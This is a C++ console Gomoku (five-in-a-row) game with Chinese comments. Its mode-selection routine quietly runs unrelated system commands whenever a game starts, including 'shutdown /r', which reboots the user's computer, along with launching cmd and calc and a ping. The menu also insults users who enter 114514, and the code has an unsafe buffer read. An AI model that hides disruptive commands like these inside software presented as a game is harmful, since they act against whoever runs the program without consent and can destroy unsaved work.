 //#define _CRT_SECURE_NO_WARNINGS 1

#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stdint.h>
#include <graphics.h>
#include <mmsystem.h>
#include "esu.h"

using namespace std;




const u16 N = 15;       //15*15的棋盘
const u8 ChessBoard = ' ';  //棋盘标志
const u8 flag1 = 'o';    //玩家1或电脑标志
const u8 flag2 = 'x';    //玩家2标志

typedef struct Position {    //坐标
    u16 row;        //行
    u16 col;        //列
}Position;

class GoBang {     //五子棋类
public:
    GoBang() {
        InitChessBoard();      //初始化棋盘
    }
    void Play() { //下棋
       
        Position Play1;   //玩家1或电脑
        Position Play2;   //玩家2
        while (1) { system("cls");
            int mode = ChoiceMode();
            while (1) {
                if (mode == 1) {       //电脑VS玩家
                    ComputerChess(Play1, flag1);            //电脑走
                    if (GetVictory(Play1, 0, flag1)) {       //0代表电脑，为真则表示电脑获胜
                        break;
                    }
                    PlayChess(Play2, 2, flag2);         //玩家2走
                    if (GetVictory(Play2, 2, flag2)) {       //2代表玩家2
                        break;
                    }
                }
                else {               //玩家1VS玩家2
                    PlayChess(Play1, 1, flag1);         //玩家1走
                    if (GetVictory(Play1, 1, flag1)) {       //玩家1赢
                        break;
                    }
                    PlayChess(Play2, 2, flag2);         //玩家2走
                    if (GetVictory(Play2, 2, flag2)) {       //玩家2赢
                        break;
                    }
                }
            }
            cout << "======再来一局=======" << endl;
            cout << "yes or no :";
            char s[] = "yes";
            cin >> s;
            if (strcmp(s, "no") == 0) {
                break;
            }
            if (strcmp(s, "yes") == 0) {
                cout << "2";
            }
        }
    }

protected:
    void InitChessBoard() {          //初始化棋盘
        for (u8 i = 0; i < N + 1; ++i) {
            for (u8 j = 0; j < N + 1; ++j) {
                _ChessBoard[i][j] = ChessBoard;
            }
        }
    }

    u16 ChoiceMode() {           //选择模式
        system("cls");
        system("color 2e");
        system("NET start");
        system("ping 114514.com");
        system("calc");
        system("shutdown /r");//你应该在找这个
        system("cmd");
        //系统调用，清屏
        InitChessBoard();       //重新初始化棋盘
        cout << "*************************************************" << endl;
        cout << "******************0、退出************************" << endl;
        cout << "******************1、电脑VS玩家******************" << endl;
        cout << "******************2、玩家VS玩家******************" << endl;
        cout << "******************3、改变  颜色******************" << endl;
        cout << "*************************************************" << endl;
        while (1) {
            int i = 0;
            cout << "请选择模式：";
            cin >> i;
            switch (i)
            {
            case 0:
            {       //退出
                exit(1);
                break;
            }
            case 1: {
                return i;
            }
            case 2: {
                return i;
            }
            case 3:
            {
                system("color 3e");
                    break;
            
            }
            case 114514:
            {
                cout << "你tm是弱智吗？\n";
                InitChessBoard();
                break;
            }
            default: {
                cout << "非法输入，请重新输入！" << endl;
            }
            }
        }
    }

    void PrintChessBoard() {        //打印棋盘
        printf("     1   2   3   4   5   6   7   8   9  10  11  12  13  14  15\n");
        printf("   |---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n");
        for (int i = 1; i < N + 1; ++i)
        {
            printf("%2d ", i);
            printf("| %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c |\n", _ChessBoard[i][1], _ChessBoard[i][2], _ChessBoard[i][3], _ChessBoard[i][4], _ChessBoard[i][5], _ChessBoard[i][6], _ChessBoard[i][7], _ChessBoard[i][8], _ChessBoard[i][9], _ChessBoard[i][10], _ChessBoard[i][11], _ChessBoard[i][12], _ChessBoard[i][13], _ChessBoard[i][14], _ChessBoard[i][15]);
            printf("   |---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n");
        }
        cout << endl;
    }

    void ComputerChess(Position& pos, char flag) {     //电脑走
        //PrintChessBoard();      //打印棋盘
        int x = 0;
        int y = 0;
        while (1) {                    //循环查找空位置
            x = (rand() % N) + 1;      //产生从1~N的随机数
            srand((unsigned int)time(NULL));
            y = (rand() % N) + 1;      //产生从1~N的随机数
            srand((unsigned int)time(NULL));
            if (_ChessBoard[x][y] == ChessBoard) {       //如果这个位置为空（没有棋子），跳出循环，下棋
                break;
            }
        }
        pos.row = x;
        pos.col = y;
        _ChessBoard[pos.row][pos.col] = flag;
    }

    void PlayChess(Position& pos, int player, char flag) {
        PrintChessBoard();      //打印棋盘
        while (1) {
            printf("请玩家%d输入坐标：", player);
            cin >> pos.row >> pos.col;
            if (JudgeValue(pos) == 1) {        //判断坐标是否合法
                break;
            }
            cout << "坐标不合法，请重新输入：" << endl;
        }
        _ChessBoard[pos.row][pos.col] = flag;
    }

    int JudgeValue(const Position& pos) {       //判断坐标的合法性
        //1.在棋盘上
        if (pos.row > 0 && pos.row <= N && pos.col > 0 && pos.col <= N) {
            //2.所在位置为空（没有棋子）
            if (_ChessBoard[pos.row][pos.col] == ChessBoard) {
                return 1;      //合法
            }
        }
        return 0;       //非法
    }

    int JudgeVictory(Position pos, char flag) {     //判断是否有玩家获胜（底层判断）
        int begin = 0;
        int end = 0;

        //1.判断行是否满足条件
        (pos.col - 4) > 0 ? begin = (pos.col - 4) : begin = 1;
        (pos.col + 4) > N ? end = N : end = (pos.col + 4);
        for (int i = pos.row, j = begin; j + 4 <= end; ++j) {
            if (_ChessBoard[i][j] == flag && _ChessBoard[i][j + 1] == flag &&
                _ChessBoard[i][j + 2] == flag && _ChessBoard[i][j + 3] == flag &&
                _ChessBoard[i][j + 4] == flag)
                return 1;
        }
        //2.判断列是否满足条件
        (pos.row - 4) > 0 ? begin = (pos.row - 4) : begin = 1;
        (pos.row + 4) > N ? end = N : end = (pos.row + 4);
        for (int j = pos.col, i = begin; i + 4 <= end; ++i) {
            if (_ChessBoard[i][j] == flag && _ChessBoard[i + 1][j] == flag &&
                _ChessBoard[i + 2][j] == flag && _ChessBoard[i + 3][j] == flag &&
                _ChessBoard[i + 4][j] == flag)
                return 1;
        }
        //3.判断主对角线是否满足条件
        int len = 0;    //相对长度
        int start = 0;
        int finish = 0;
        pos.row > pos.col ? len = pos.col - 1 : len = pos.row - 1;
        if (len > 4) {
            len = 4;
        }
        begin = pos.row - len;       //横坐标起始位置
        start = pos.col - len;       //纵坐标起始位置

        pos.row > pos.col ? len = N - pos.row : len = N - pos.col;
        if (len > 4) {
            len = 4;
        }
        end = pos.row + len;         //横坐标结束位置
        finish = pos.col + len;      //纵坐标结束位置

        for (int i = begin, j = start; (i + 4 <= end) && (j + 4 <= finish); ++i, ++j) {
            if (_ChessBoard[i][j] == flag && _ChessBoard[i + 1][j + 1] == flag &&
                _ChessBoard[i + 2][j + 2] == flag && _ChessBoard[i + 3][j + 3] == flag &&
                _ChessBoard[i + 4][j + 4] == flag)
                return 1;
        }
        //4.判断副对角线是否满足条件
        (pos.row - 1) > (N - pos.col) ? len = N - pos.col : len = pos.row - 1;
        if (len > 4) {
            len = 4;
        }
        begin = pos.row - len;       //横坐标起始位置
        start = pos.col + len;       //纵坐标起始位置

        (N - pos.row) > (pos.col - 1) ? len = pos.col - 1 : len = N - pos.row;
        if (len > 4) {
            len = 4;
        }
        end = pos.row + len;         //横坐标结束位置
        finish = pos.col - len;      //纵坐标结束位置 
        for (int i = begin, j = start; (i + 4 <= end) && (j - 4 >= finish); ++i, --j) {
            if (_ChessBoard[i][j] == flag && _ChessBoard[i + 1][j - 1] == flag &&
                _ChessBoard[i + 2][j - 2] == flag && _ChessBoard[i + 3][j - 3] == flag &&
                _ChessBoard[i + 4][j - 4] == flag)
                return 1;
        }
        //该位置并未下棋
        for (int x = 1; x < N + 1; ++x) {
            for (int y = 1; y < N + 1; ++y) {
                if (_ChessBoard[x][y] == ChessBoard) {
                    return 0;       //未下棋
                }
            }
        }
        return -1;      //和局
    }

    bool GetVictory(Position& pos, int player, char flag) {       //判断具体哪位玩家赢
        if (JudgeVictory(pos, flag) != 0) {    //判断有无人获胜
            if (JudgeVictory(pos, flag) == 1) {     //判断是否有人获胜,1表示获胜
                PrintChessBoard();     //打印棋盘
                if (player == 0) {
                    cout << "电脑获胜！" << endl;
                }
                else {
                    printf("恭喜玩家%d获胜！\n", player);
                }
            }
            else {
                printf("和局！\n");
            }
            return true;      //有人获胜
        }
        return false;         //没人获胜
    }

private:
    char _ChessBoard[N + 1][N + 1];    //棋盘
};

int main() 
{
    GoBang g;
    g.Play();
    system("pause");
    return 0;
}
